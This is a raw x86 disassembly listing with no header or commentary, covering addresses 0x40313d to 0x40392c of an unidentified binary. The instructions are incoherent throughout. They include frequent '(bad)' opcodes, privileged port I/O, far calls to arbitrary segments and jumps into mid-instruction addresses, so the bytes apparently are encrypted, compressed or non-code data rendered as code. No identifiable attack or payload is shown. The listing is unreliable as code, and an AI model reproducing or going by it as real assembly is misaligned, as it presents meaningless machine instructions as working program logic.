  40313d:	cdq    
  40313e:	pop    ecx
  40313f:	call   0xd7e2:0xdb295e7e
  403146:	add    DWORD PTR [esi],esp
  403148:	or     DWORD PTR [ecx+0x48a85916],0xffffffe1
  40314f:	daa    
  403150:	fs (bad) 
  403152:	and    DWORD PTR [eax],esp
  403154:	mov    edx,0x1c44dd01
  403159:	and    dl,BYTE PTR [edx+ebx*8]
  40315c:	addr16 dec edi
  40315e:	das    
  40315f:	push   ecx
  403160:	push   edx
  403161:	sub    ah,BYTE PTR [ebx]
  403163:	mov    edx,0x4283dcfb
  403168:	arpl   bp,di
  40316a:	pop    es
  40316b:	aas    
  40316c:	daa    
  40316d:	pop    ss
  40316e:	or     BYTE PTR [ebx*2-0x143ebe08],cl
  403175:	daa    
  403176:	xor    al,0xed
  403178:	fcom   DWORD PTR [edi]
  40317a:	ss push esp
  40317c:	sbb    eax,0xf70e238
  403181:	xchg   ebx,eax
  403182:	cmp    al,0x25
  403184:	mov    al,ds:0xa0d4981d
  403189:	lock rcl BYTE PTR [edx+0x66f8be7b],0x38
  403191:	das    
  403192:	js     0x4031da
  403194:	out    0x13,eax
  403196:	cmp    dh,BYTE PTR [ecx+0x7d868df8]
  40319c:	mov    eax,ecx
  40319e:	xchg   BYTE PTR [ecx-0x44],dl
  4031a1:	mov    DWORD PTR [edx+0x52],ecx
  4031a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031a5:	fidiv  WORD PTR [ecx-0x45802639]
  4031ab:	push   eax
  4031ac:	stc    
  4031ad:	adc    BYTE PTR [esi+0x53],ah
  4031b0:	or     eax,0xca8f5e53
  4031b6:	ds cmc 
  4031b8:	aas    
  4031b9:	mov    bh,BYTE PTR [ecx-0x7154e63c]
  4031bf:	in     al,0xdd
  4031c1:	loop   0x4031b8
  4031c3:	fucomip st,st(2)
  4031c5:	xchg   esp,eax
  4031c6:	jnp    0x4031e0
  4031c8:	jb     0x403218
  4031ca:	fsubr  st(5),st
  4031cc:	dec    BYTE PTR [ecx]
  4031ce:	ss xor eax,0x8969fcf2
  4031d4:	adc    esp,DWORD PTR [bx+si]
  4031d7:	pushf  
  4031d8:	mov    ecx,0x6861ac39
  4031dd:	int    0x83
  4031df:	mov    eax,0x4be12e84
  4031e4:	rol    BYTE PTR [ecx],cl
  4031e6:	ins    BYTE PTR es:[edi],dx
  4031e7:	inc    esi
  4031e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031e9:	and    BYTE PTR [eax],0x4d
  4031ec:	ret    0x2450
  4031ef:	mov    fs,WORD PTR ds:0x236ba85b
  4031f5:	mov    esp,0x3e0f3be8
  4031fa:	cmp    ebx,DWORD PTR [esi]
  4031fc:	(bad)  [eax]
  4031fe:	mov    ebp,0x6000a6b9
  403203:	sub    BYTE PTR [ebp-0x60],0xcc
  403207:	cdq    
  403208:	inc    ebp
  403209:	xchg   BYTE PTR [ebx],bl
  40320b:	pop    esi
  40320c:	and    BYTE PTR [edi-0x49],0x7d
  403210:	sub    al,0x87
  403212:	ret    
  403213:	inc    ebp
  403214:	inc    edi
  403215:	icebp  
  403216:	mov    WORD PTR [ebp+0x69c18663],ss
  40321c:	out    0xb9,eax
  40321e:	sbb    BYTE PTR [ebx-0x77],0xf
  403222:	stos   DWORD PTR es:[edi],eax
  403223:	and    bh,dl
  403225:	adc    ecx,DWORD PTR [edx]
  403227:	mov    dh,0x5c
  403229:	cs sahf 
  40322b:	cmc    
  40322c:	ss dec edx
  40322e:	nop
  40322f:	stc    
  403230:	into   
  403231:	loop   0x403278
  403233:	mov    esp,0x21002250
  403238:	sub    ch,BYTE PTR [edi-0x35]
  40323b:	jmp    0x403239
  40323d:	es (bad) 
  403240:	enter  0x5328,0x83
  403244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403245:	cmp    al,0x23
  403247:	lods   eax,DWORD PTR ds:[esi]
  403248:	addr16 cs and dl,dh
  40324c:	test   edi,eax
  40324e:	push   ss
  40324f:	dec    ebp
  403250:	mov    bl,0x28
  403252:	ss xor ebx,ecx
  403255:	out    dx,eax
  403256:	add    eax,0xb0ba2d56
  40325b:	mov    bl,0xc1
  40325d:	sub    ecx,DWORD PTR [ebx]
  40325f:	ins    BYTE PTR es:[edi],dx
  403260:	(bad)  
  403261:	jae    0x403264
  403263:	xchg   edi,eax
  403264:	or     DWORD PTR [ebx+ecx*2+0x570435d0],esi
  40326b:	call   0x8d84:0x25d4966f
  403272:	jae    0x40322b
  403274:	xchg   edi,eax
  403275:	mov    dl,0x18
  403277:	and    bh,bh
  403279:	and    eax,0x3aa0c675
  40327e:	pop    edi
  40327f:	fmul   DWORD PTR [ebp-0x5c]
  403282:	add    eax,0x22fd98a9
  403287:	mov    ds:0x6f9f4e8a,al
  40328c:	das    
  40328d:	push   ecx
  40328e:	mov    BYTE PTR [edi-0x3c],ah
  403291:	ror    BYTE PTR ds:0xaf09d993,1
  403297:	adc    edi,ebx
  403299:	mov    WORD PTR gs:[edi+ebp*4],fs
  40329d:	mov    DWORD PTR [ecx+0x22],edx
  4032a0:	push   ecx
  4032a1:	xchg   esp,eax
  4032a2:	lods   al,BYTE PTR ds:[esi]
  4032a3:	mov    cl,0x5e
  4032a5:	cmp    BYTE PTR [ebx+eiz*4-0x4],bl
  4032a9:	cmp    ebx,DWORD PTR [ebp-0x7fc4cbaa]
  4032af:	sahf   
  4032b0:	jg     0x4032cb
  4032b2:	jge    0x4032ad
  4032b4:	dec    edx
  4032b5:	sbb    bh,BYTE PTR [ecx-0x5a]
  4032b8:	adc    edx,DWORD PTR [eax+0x73]
  4032bb:	mov    edx,DWORD PTR [ebx+eax*4+0x38d2849]
  4032c2:	dec    eax
  4032c3:	xchg   ecx,eax
  4032c4:	jmp    0x403336
  4032c6:	pop    ebp
  4032c7:	int    0xa1
  4032c9:	inc    esi
  4032ca:	add    BYTE PTR [ebp-0x6a],cl
  4032cd:	repnz mov ebx,0xc4ee5799
  4032d3:	inc    esi
  4032d4:	(bad)  
  4032d6:	adc    DWORD PTR [edx-0x25],eax
  4032d9:	add    DWORD PTR [ebx+edi*2],esp
  4032dc:	stc    
  4032dd:	mov    gs,WORD PTR ds:0x9e8f1e23
  4032e3:	pusha  
  4032e4:	les    edi,FWORD PTR [esi+0x37e78f0]
  4032ea:	scas   al,BYTE PTR es:[edi]
  4032eb:	les    esp,FWORD PTR [edx]
  4032ed:	jne    0x40328f
  4032ef:	iret   
  4032f0:	les    ecx,FWORD PTR [esi-0x3c91558b]
  4032f6:	out    0xbb,al
  4032f8:	sub    DWORD PTR [edi+0x2],ebp
  4032fb:	shl    BYTE PTR [eax+0x27],1
  4032fe:	sahf   
  4032ff:	(bad)  
  403300:	ss dec esp
  403302:	xor    al,0x17
  403304:	xchg   edx,eax
  403305:	jle    0x4032f5
  403307:	pop    ebx
  403308:	call   0x6eab625
  40330d:	nop
  40330e:	ret    0x2227
  403311:	and    BYTE PTR [edi+0x2193c6aa],bl
  403317:	jns    0x403365
  403319:	push   ebx
  40331a:	inc    eax
  40331b:	xchg   esp,eax
  40331c:	aaa    
  40331d:	mov    ecx,0x63e1482c
  403322:	(bad)  
  403323:	fucompp 
  403325:	and    ebp,ecx
  403327:	xor    cl,BYTE PTR [edi]
  403329:	sub    al,ch
  40332b:	fidivr WORD PTR [ecx+0x72440ba7]
  403331:	enter  0x66ee,0xb8
  403335:	jl     0x403344
  403337:	imul   esp,DWORD PTR [eax+0x46],0xb76db078
  40333e:	outs   dx,DWORD PTR ds:[esi]
  40333f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403340:	aas    
  403341:	mov    edx,0x975e366e
  403346:	mov    al,0x9e
  403348:	mov    BYTE PTR [ebx+0x62],0x78
  40334c:	clc    
  40334d:	pop    es
  40334e:	jl     0x40331c
  403350:	cld    
  403351:	aas    
  403352:	push   ebp
  403353:	inc    esp
  403354:	imul   edx,esp,0xb2e5e39e
  40335a:	mov    edx,0xec7d5f30
  40335f:	loope  0x40335a
  403361:	and    al,0xb9
  403363:	aam    0xa2
  403365:	add    esp,0x10
  403368:	mov    ecx,0xd1e35dfa
  40336d:	(bad)  
  40336f:	jge    0x40334d
  403371:	dec    esi
  403372:	or     BYTE PTR [ecx+0x105b276c],ch
  403378:	dec    eax
  403379:	ja     0x403346
  40337b:	imul   ebp,ecx,0x4ef58b19
  403381:	or     al,0x5a
  403383:	loopne 0x403374
  403385:	add    DWORD PTR [esi-0x29],ebx
  403388:	xchg   esi,eax
  403389:	les    esp,FWORD PTR [edi-0x76]
  40338c:	pop    esi
  40338d:	pusha  
  40338e:	ja     0x4033d5
  403390:	jae    0x4033ca
  403392:	dec    ecx
  403393:	push   0xffffffdf
  403395:	fbstp  TBYTE PTR [eax]
  403397:	xchg   esp,eax
  403398:	xchg   ebx,eax
  403399:	pop    ss
  40339a:	cmp    DWORD PTR [ebx+0x1d],eax
  40339d:	cmp    eax,DWORD PTR [edi+0x1ac6eba5]
  4033a3:	mov    bh,0xfc
  4033a5:	mov    ebp,0xcfbd613
  4033aa:	mov    ecx,0x41be65e1
  4033af:	das    
  4033b0:	cdq    
  4033b1:	lods   eax,DWORD PTR ds:[esi]
  4033b2:	and    eax,0x14901d7d
  4033b7:	mov    ds:0xe905698c,eax
  4033bc:	les    ecx,FWORD PTR [edx+0x12]
  4033bf:	adc    ebx,DWORD PTR [bp+di+0x3f85]
  4033c4:	test   al,0x20
  4033c6:	mov    ch,0x4b
  4033c8:	or     DWORD PTR [ebp+0x34],eax
  4033cb:	aaa    
  4033cc:	imul   BYTE PTR [ebx-0x15]
  4033cf:	jp     0x403389
  4033d1:	sti    
  4033d2:	fcom   st(4)
  4033d4:	stc    
  4033d5:	popf   
  4033d6:	dec    esi
  4033d7:	mov    ch,0xcf
  4033d9:	iret   
  4033da:	(bad)  
  4033db:	idiv   ebp
  4033dd:	ins    DWORD PTR es:[edi],dx
  4033de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033df:	add    ebp,DWORD PTR ds:0xa9660f69
  4033e5:	jne    0x4033fe
  4033e7:	out    0xa4,eax
  4033e9:	stc    
  4033ea:	inc    ebp
  4033eb:	adc    DWORD PTR [esi-0x14],ebx
  4033ee:	xchg   esi,eax
  4033ef:	lahf   
  4033f0:	sub    eax,0x2212565c
  4033f5:	adc    edi,ebx
  4033f7:	sub    bh,0xa5
  4033fa:	(bad)  
  4033fb:	nop
  4033fc:	shl    BYTE PTR [esi],cl
  4033fe:	jmp    0xf2cf:0xae63dbc1
  403405:	dec    esp
  403406:	mov    esi,0x68868aca
  40340b:	in     al,dx
  40340c:	(bad)  
  40340d:	outs   dx,BYTE PTR ds:[esi]
  40340e:	rol    DWORD PTR [ecx],0x4
  403411:	stos   DWORD PTR es:[edi],eax
  403412:	dec    esp
  403413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403414:	inc    esi
  403415:	and    esi,DWORD PTR [edx+0x23bc3be8]
  40341b:	jge    0x4033cf
  40341d:	jnp    0x403432
  40341f:	sbb    bh,BYTE PTR [eax+0x4b79e170]
  403425:	ret    0x32c2
  403428:	(bad)  
  403429:	rcl    DWORD PTR [ecx-0x3],0xde
  40342d:	or     eax,DWORD PTR [edi]
  40342f:	retf   
  403430:	popa   
  403431:	es scas eax,DWORD PTR es:[edi]
  403433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403434:	int3   
  403435:	push   ss
  403436:	scas   eax,DWORD PTR es:[edi]
  403437:	rcl    BYTE PTR ds:0x3e1929eb,0xfe
  40343e:	das    
  40343f:	add    al,0x51
  403441:	test   DWORD PTR [esi+eax*2-0x11],edi
  403445:	push   cs
  403446:	pop    esp
  403447:	ret    
  403448:	or     esi,DWORD PTR [ecx-0x79f5c749]
  40344e:	pop    ss
  40344f:	mov    ds:0xf37f34fb,eax
  403454:	loope  0x403483
  403456:	mov    al,0xd4
  403458:	xchg   edi,eax
  403459:	jo     0x4034bb
  40345b:	clc    
  40345c:	test   al,0x37
  40345e:	mov    ds:0xbcaf4e44,eax
  403463:	cmp    DWORD PTR [eax-0x3b],0xa358e6e1
  40346a:	push   edi
  40346b:	mov    ebp,0xea3a24bc
  403470:	sbb    dl,dl
  403472:	mov    esp,0x38851b27
  403477:	or     ebx,esp
  403479:	jae    0x4034c1
  40347b:	data16 jae 0x40347c
  40347e:	cmp    BYTE PTR ds:0x53be93ad,bh
  403484:	push   eax
  403485:	or     esi,DWORD PTR [ebx+0x42]
  403488:	mov    eax,ds:0x83e92b7
  40348d:	add    bh,BYTE PTR [esi]
  40348f:	stos   BYTE PTR es:[edi],al
  403490:	bound  edx,QWORD PTR [esi]
  403492:	xchg   edi,eax
  403493:	or     BYTE PTR [eax+ecx*2],0xaa
  403497:	xchg   BYTE PTR [edx+0x74cbd668],bl
  40349d:	and    DWORD PTR [ebp+edi*4-0x5101cb],ecx
  4034a4:	push   ss
  4034a5:	xor    BYTE PTR fs:[edx],ah
  4034a8:	push   ebx
  4034a9:	lds    esp,FWORD PTR [ebx]
  4034ab:	loop   0x40349c
  4034ad:	iret   
  4034ae:	popf   
  4034af:	xchg   ebp,eax
  4034b0:	lea    edx,[edi-0x44c59ce5]
  4034b6:	pop    ss
  4034b7:	sub    edx,DWORD PTR [eax+edi*4]
  4034ba:	mul    DWORD PTR ds:0x4d8003e7
  4034c0:	xchg   esi,eax
  4034c1:	call   0x6743:0x89709970
  4034c8:	sub    dh,BYTE PTR [ecx]
  4034ca:	sahf   
  4034cb:	or     edx,DWORD PTR [eax+edx*4+0x73]
  4034cf:	or     ebp,DWORD PTR [ebp+0x16]
  4034d2:	ffreep st(5)
  4034d4:	xor    BYTE PTR [eax+0x1c81bd6],bl
  4034da:	inc    edi
  4034db:	xchg   esp,eax
  4034dc:	lock cmp eax,DWORD PTR [eax+0x3b]
  4034e0:	aam    0xdf
  4034e2:	addr16 jmp 0xed80:0x2d19c211
  4034ea:	mov    eax,0x75730e8a
  4034ef:	pop    ecx
  4034f0:	sbb    dh,dh
  4034f2:	sbb    ah,BYTE PTR ds:0x91b3a35e
  4034f8:	sar    BYTE PTR [ebx-0x4b2117a4],cl
  4034fe:	retf   
  4034ff:	inc    eax
  403501:	jle    0x40348a
  403503:	(bad)  
  403504:	nop
  403505:	sub    eax,0xb17de7c
  40350a:	inc    ecx
  40350b:	shl    dh,0xd
  40350e:	or     BYTE PTR [edx-0x60],ch
  403511:	cli    
  403512:	mov    bl,0x99
  403514:	and    BYTE PTR [edi+0x3aec4c0b],dh
  40351a:	stos   BYTE PTR es:[edi],al
  40351b:	jb     0x4034a6
  40351d:	ins    BYTE PTR es:[edi],dx
  40351e:	adc    ebx,ebx
  403520:	mov    edi,0xf5c45647
  403525:	adc    al,0x68
  403527:	or     al,0xa1
  403529:	mov    ebx,edx
  40352b:	div    ebx
  40352d:	data16 adc al,0xb8
  403530:	retf   
  403531:	jle    0x403567
  403533:	or     eax,0xcd2694ad
  403538:	adc    edx,DWORD PTR ss:[edi-0x20]
  40353c:	call   0x8321:0x99963497
  403543:	dec    esp
  403544:	inc    eax
  403545:	sub    al,0x18
  403547:	sub    ecx,DWORD PTR [ebx]
  403549:	mov    cl,0xeb
  40354b:	sub    ecx,DWORD PTR [esi]
  40354d:	in     al,dx
  40354e:	arpl   bp,si
  403550:	mov    bl,0x82
  403552:	and    ecx,DWORD PTR [ebx-0x6ed8356e]
  403558:	neg    DWORD PTR [ecx+0x3]
  40355b:	jge    0x4035c3
  40355d:	and    BYTE PTR [esi+0x2dd1f9d],dl
  403563:	pop    ebp
  403564:	scas   eax,DWORD PTR es:[edi]
  403565:	or     al,0x1d
  403567:	adc    al,0x93
  403569:	repz pop ss
  40356b:	loop   0x403572
  40356d:	xor    al,0xda
  40356f:	iret   
  403570:	add    dh,BYTE PTR [eax-0x5d]
  403573:	fsubr  DWORD PTR [edx-0x6f4dfab0]
  403579:	jmp    0xc40cf564
  40357e:	lock add dl,cl
  403581:	inc    edi
  403582:	leave  
  403583:	out    0x2f,al
  403585:	aaa    
  403586:	pop    ds
  403587:	in     eax,dx
  403588:	xor    edi,DWORD PTR [esi+edi*1]
  40358b:	dec    esi
  40358c:	push   ds
  40358d:	cs int 0x6a
  403590:	call   0x3732c2ff
  403595:	fcomp  QWORD PTR [ecx]
  403597:	iret   
  403598:	mov    al,0xef
  40359a:	push   edx
  40359b:	ds push eax
  40359d:	mov    ebp,0x339ada5a
  4035a2:	das    
  4035a3:	loopne 0x403547
  4035a5:	mov    dh,0x4c
  4035a7:	call   0x89cb:0xe89b45af
  4035ae:	div    ebp
  4035b0:	sub    DWORD PTR [edi+0x6fe152b9],esi
  4035b6:	add    eax,0xcb3e9934
  4035bb:	rol    BYTE PTR [eax-0xa],cl
  4035be:	into   
  4035bf:	mov    eax,ds:0x3b493062
  4035c4:	or     eax,0xf2539da8
  4035c9:	dec    eax
  4035ca:	xchg   edx,eax
  4035cb:	xchg   DWORD PTR ds:0x9eeb3238,ebx
  4035d1:	jo     0x4035f2
  4035d3:	push   ds
  4035d4:	mov    ecx,0x60134900
  4035d9:	push   cs
  4035da:	loopne 0x40357d
  4035dc:	pop    ds
  4035dd:	adc    al,0x95
  4035df:	loop   0x403606
  4035e1:	imul   esi,DWORD PTR [eax+0x0],0x9b913f51
  4035e8:	inc    ecx
  4035e9:	ins    DWORD PTR es:[edi],dx
  4035ea:	pop    ebp
  4035eb:	shr    BYTE PTR [edx+0x74f0593b],0x33
  4035f2:	mov    ds:0xd952eda6,eax
  4035f7:	ret    
  4035f8:	arpl   WORD PTR [eax-0x8b9f8ed],cx
  4035fe:	sub    eax,0xf9ff995e
  403603:	test   DWORD PTR [ebx-0x55],0xd44854a6
  40360a:	sub    DWORD PTR [edi-0x5f23b951],0x1bbff38d
  403614:	mov    ah,0x5a
  403616:	add    esi,0x25bcfb84
  40361c:	ss leave 
  40361e:	js     0x76390b16
  403624:	outs   dx,DWORD PTR ds:[esi]
  403625:	pop    esi
  403626:	fcom   DWORD PTR [edx]
  403628:	scas   eax,DWORD PTR es:[edi]
  403629:	loope  0x4036a1
  40362b:	jb     0x40367f
  40362d:	dec    esi
  40362e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40362f:	dec    esi
  403630:	push   esi
  403631:	jmp    0x403683
  403633:	push   eax
  403634:	stos   DWORD PTR es:[edi],eax
  403635:	mov    ds:0x25e1410a,eax
  40363a:	add    DWORD PTR [edx+eax*4+0x60830da6],0x76
  403642:	sar    BYTE PTR [esi-0x59894131],0xe8
  403649:	rcr    DWORD PTR [edi],1
  40364b:	pop    esp
  40364c:	mov    dh,0xb5
  40364e:	mov    WORD PTR [ebx-0x218da1c8],cs
  403654:	lds    ecx,FWORD PTR [edx+0x2b]
  403657:	je     0x403632
  403659:	fs xchg ecx,eax
  40365b:	into   
  40365c:	test   DWORD PTR [edi],eax
  40365e:	mov    ch,0x22
  403660:	push   ds
  403661:	sub    ch,cl
  403663:	(bad)  
  403664:	ds jne 0x4036cb
  403667:	enter  0xde54,0x59
  40366b:	or     eax,0x2d77dc2d
  403670:	push   0xf53e5f3b
  403675:	xor    eax,0xcb73e13
  40367a:	xor    dh,BYTE PTR [ebp+0x6a]
  40367d:	fdiv   QWORD PTR [edx]
  40367f:	add    al,0xef
  403681:	jmp    0x71c:0xdfb9e9ac
  403688:	popf   
  403689:	adc    al,0x3
  40368b:	push   ds
  40368c:	sbb    DWORD PTR [ebx+eiz*1+0x0],edx
  403690:	adc    DWORD PTR [eax-0x4e879993],eax
  403696:	xchg   ecx,eax
  403697:	xchg   ah,bl
  403699:	cmp    DWORD PTR [ecx+ebx*4-0x5b937b84],edi
  4036a0:	retf   
  4036a1:	loopne 0x403716
  4036a3:	adc    BYTE PTR [esi+0x2f],bl
  4036a6:	fsubrp st(5),st
  4036a8:	jb     0x4036cf
  4036aa:	mov    ecx,0xa84d7e8f
  4036af:	and    dh,BYTE PTR [ebx]
  4036b1:	or     bh,cl
  4036b3:	mov    bl,0x1c
  4036b5:	push   ss
  4036b6:	in     al,dx
  4036b7:	mov    ecx,0x7a8510a1
  4036bc:	and    eax,0x5cd79e7f
  4036c1:	xor    DWORD PTR [edi-0x31858c94],ebx
  4036c7:	inc    esi
  4036c8:	ret    0x73f1
  4036cb:	jp     0x403704
  4036cd:	hlt    
  4036ce:	push   eax
  4036cf:	push   edi
  4036d0:	pop    ss
  4036d1:	jnp    0x4036b6
  4036d3:	pushf  
  4036d4:	retf   0x2ebb
  4036d7:	sub    dh,BYTE PTR [ecx]
  4036d9:	and    esi,DWORD PTR [esi+edx*2]
  4036dc:	mov    eax,ds:0x5f9c8015
  4036e1:	hlt    
  4036e2:	shl    DWORD PTR [edx+0xf],0x85
  4036e6:	sub    al,0x20
  4036e8:	sub    edx,esp
  4036ea:	jmp    0x9e16:0x1ab02e35
  4036f1:	test   al,0x25
  4036f3:	sbb    DWORD PTR [edi+0x31],esi
  4036f6:	and    ecx,DWORD PTR [ecx]
  4036f8:	pop    es
  4036f9:	push   ebp
  4036fa:	push   esi
  4036fb:	call   0xc1f6:0x84a31cac
  403702:	mov    edx,0xf56f149f
  403707:	dec    edx
  403708:	les    ecx,FWORD PTR [eax]
  40370a:	(bad)  
  40370c:	xor    eax,0x4e606884
  403711:	fild   QWORD PTR [ecx+0x1da0e785]
  403717:	in     eax,0xce
  403719:	out    dx,eax
  40371a:	stos   DWORD PTR es:[edi],eax
  40371b:	or     eax,0x9da890d4
  403720:	das    
  403721:	adc    BYTE PTR [edx],bl
  403723:	inc    edx
  403724:	into   
  403725:	sub    ecx,0xfffffff0
  403728:	and    DWORD PTR [ebp-0x7982d7cf],0xfffffff3
  40372f:	push   0x7242f7c
  403734:	inc    edx
  403735:	sub    edi,DWORD PTR [edi-0x64]
  403738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403739:	rol    bh,1
  40373b:	fist   WORD PTR [edx-0x21]
  40373e:	cld    
  40373f:	xlat   BYTE PTR ds:[ebx]
  403740:	cmp    ah,BYTE PTR [edx+eax*4]
  403743:	iret   
  403744:	xchg   BYTE PTR [ecx],ch
  403746:	and    eax,0x9b245c7a
  40374b:	cld    
  40374c:	fcom   DWORD PTR [edi+0xf]
  40374f:	adc    eax,ebx
  403751:	inc    eax
  403752:	ins    DWORD PTR es:[edi],dx
  403753:	lds    edi,FWORD PTR [ecx+0x1c]
  403756:	aad    0x25
  403758:	xchg   edx,eax
  403759:	and    ebx,DWORD PTR [ecx]
  40375b:	jo     0x40379f
  40375d:	das    
  40375e:	pop    edx
  40375f:	sbb    eax,0x43aeaaa0
  403764:	sti    
  403765:	push   es
  403766:	jecxz  0x4037ad
  403768:	mov    al,ds:0xa0549aa7
  40376d:	or     DWORD PTR [edi-0x22],esi
  403770:	in     al,dx
  403771:	sar    DWORD PTR [edx+esi*1],1
  403774:	add    bh,BYTE PTR [ebp+0x13]
  403777:	push   edi
  403778:	les    eax,FWORD PTR [esi+edx*2]
  40377b:	cli    
  40377c:	push   esi
  40377d:	or     DWORD PTR [edx],eax
  40377f:	and    ecx,ecx
  403781:	scas   eax,DWORD PTR es:[edi]
  403782:	ret    
  403783:	(bad)  
  403784:	lods   al,BYTE PTR ds:[esi]
  403785:	push   ebp
  403786:	add    al,0xe3
  403788:	sbb    DWORD PTR [esi+eiz*4],esp
  40378b:	xchg   edx,eax
  40378c:	dec    eax
  40378d:	outs   dx,DWORD PTR ds:[esi]
  40378e:	loopne 0x4037bb
  403790:	ins    BYTE PTR es:[edi],dx
  403791:	test   eax,ebx
  403793:	mov    dh,0x20
  403795:	jmp    0x9ca4:0x3f076ef0
  40379c:	es jp  0x4037a6
  40379f:	aam    0x57
  4037a1:	mov    cl,0xe3
  4037a3:	mov    al,0x18
  4037a5:	sbb    esi,DWORD PTR [edx+0x33]
  4037a8:	popf   
  4037a9:	imul   edx,DWORD PTR [ecx+0x7465d84],0x22
  4037b0:	aad    0x8c
  4037b2:	fs pop ds
  4037b4:	lea    ecx,[ebx+edi*8+0x7f]
  4037b8:	inc    esi
  4037b9:	fistp  QWORD PTR [ebx-0x37604fc9]
  4037bf:	xor    ebx,ecx
  4037c1:	adc    bh,BYTE PTR ds:0x814f1a0c
  4037c7:	mov    esi,0x2224356a
  4037cc:	retf   
  4037cd:	mov    ecx,edi
  4037cf:	jmp    0x9eba98be
  4037d4:	es rol eax,cl
  4037d7:	sub    eax,0x6f54a276
  4037dc:	inc    edi
  4037dd:	popa   
  4037de:	ficom  WORD PTR [ebx-0x707d634b]
  4037e4:	test   al,0x3c
  4037e6:	cmp    al,0x3f
  4037e8:	dec    edi
  4037e9:	pop    ebx
  4037ea:	cli    
  4037eb:	mov    bh,0x1e
  4037ed:	adc    al,0x6e
  4037ef:	out    dx,al
  4037f0:	inc    esp
  4037f1:	or     eax,0x2a09a458
  4037f6:	mov    gs,WORD PTR [eax-0x41374005]
  4037fc:	cmp    edi,DWORD PTR [eax-0x4111d4f]
  403802:	pop    eax
  403803:	call   0x3edff6c1
  403808:	shr    DWORD PTR [edi-0x7],1
  40380b:	and    edx,0x31
  40380e:	mov    al,ds:0xd8196870
  403813:	jmp    0x403865
  403815:	jno    0x403806
  403817:	outs   dx,BYTE PTR ds:[esi]
  403818:	jnp    0x403893
  40381a:	ja     0x403833
  40381c:	jp     0x4037e4
  40381e:	out    0x11,eax
  403820:	addr16 loopne 0x403885
  403823:	push   0x63
  403825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403826:	xchg   DWORD PTR [eax],ebp
  403828:	jo     0x403851
  40382a:	jae    0x403816
  40382c:	aaa    
  40382d:	push   eax
  40382e:	mov    ch,0xab
  403830:	arpl   WORD PTR [edi+eiz*8+0x6c9de4cd],dx
  403837:	push   es
  403838:	enter  0xdce5,0xf8
  40383c:	xchg   ebp,eax
  40383d:	mov    cs:0x8e09c1b,eax
  403843:	div    DWORD PTR [esi+0x5b]
  403846:	stos   BYTE PTR es:[edi],al
  403847:	pop    esi
  403848:	push   ecx
  403849:	xor    esp,DWORD PTR ds:0x184a2c9b
  40384f:	push   0xffffffaa
  403851:	pop    ecx
  403852:	adc    al,0xcb
  403854:	fldenv [eax-0x2d]
  403857:	push   0x3b
  403859:	aam    0x92
  40385b:	inc    ecx
  40385c:	adc    dh,cl
  40385e:	imul   esp,DWORD PTR [edx-0x30568b71],0xffffff9c
  403865:	xchg   cl,dl
  403867:	pop    ebx
  403868:	mov    eax,0xf85dcd9
  40386d:	fistp  DWORD PTR [ebx-0x5f6df60f]
  403873:	xor    al,0x2c
  403875:	test   al,0x38
  403877:	xchg   edx,eax
  403878:	cld    
  403879:	push   esp
  40387a:	jl     0x403815
  40387c:	xor    eax,ebp
  40387e:	and    BYTE PTR [esi-0x4e69ae37],bh
  403884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403885:	(bad)  
  403886:	(bad)  
  403887:	dec    ebx
  403888:	adc    al,0x56
  40388a:	or     BYTE PTR ds:0xd63aa2c4,al
  403890:	dec    edi
  403891:	xor    BYTE PTR [ebx-0x1bf91b56],ah
  403897:	jae    0x403854
  403899:	sbb    eax,0x4bb55da4
  40389e:	xchg   DWORD PTR [eax],eax
  4038a0:	repnz pop esi
  4038a2:	popa   
  4038a3:	cmp    dl,ah
  4038a5:	pop    ebx
  4038a6:	mov    edx,0x9d0b8469
  4038ab:	fdiv   st(2),st
  4038ad:	dec    eax
  4038ae:	pop    ecx
  4038af:	jge    0x4038d4
  4038b1:	retf   0x3c09
  4038b4:	dec    esi
  4038b5:	repz inc edi
  4038b7:	push   ds
  4038b8:	das    
  4038b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ba:	fsub   QWORD PTR [ecx]
  4038bc:	fld    DWORD PTR [ebx-0x6a49c098]
  4038c2:	jo     0x4038f9
  4038c4:	push   ds
  4038c5:	jp     0x4038ad
  4038c7:	mov    bh,0x3b
  4038c9:	les    edx,FWORD PTR [ebp-0x42958b68]
  4038cf:	dec    esi
  4038d0:	in     eax,0xd1
  4038d2:	or     dh,BYTE PTR [ecx-0x31c0b6cb]
  4038d8:	out    0xed,al
  4038da:	fist   WORD PTR [ebx]
  4038dc:	out    0x2c,al
  4038de:	inc    ecx
  4038df:	loope  0x40393d
  4038e1:	cs leave 
  4038e3:	xlat   BYTE PTR ds:[ebx]
  4038e4:	dec    BYTE PTR [ecx-0x2f]
  4038e7:	hlt    
  4038e8:	retf   
  4038e9:	lods   eax,DWORD PTR ds:[esi]
  4038ea:	outs   dx,BYTE PTR ds:[esi]
  4038eb:	outs   dx,DWORD PTR ds:[esi]
  4038ec:	dec    esp
  4038ed:	shl    DWORD PTR [ecx-0xb],1
  4038f0:	push   esi
  4038f1:	call   0x66e:0x66ba2219
  4038f8:	out    dx,eax
  4038f9:	adc    esp,ebp
  4038fb:	nop
  4038fc:	cmp    al,0x85
  4038fe:	in     al,0x3a
  403900:	push   edi
  403901:	xchg   ecx,eax
  403902:	test   DWORD PTR [edi+edi*2+0x20],edx
  403906:	out    0x70,al
  403908:	sbb    eax,0x571c792c
  40390d:	loope  0x4038fa
  40390f:	jo     0x4038cf
  403911:	push   ebx
  403912:	pop    esp
  403913:	xchg   ebp,eax
  403914:	sub    al,0x2a
  403916:	mov    eax,DWORD PTR [ebx]
  403918:	and    ah,dl
  40391a:	push   eax
  40391b:	jns    0x403967
  40391d:	sbb    eax,esi
  40391f:	jl     0x40394c
  403921:	ins    DWORD PTR es:[edi],dx
  403922:	cmp    al,0xfc
  403924:	aad    0x4e
  403926:	scas   eax,DWORD PTR es:[edi]
  403927:	sbb    eax,0x183e54b3
  40392c:	xor    ebx,edi
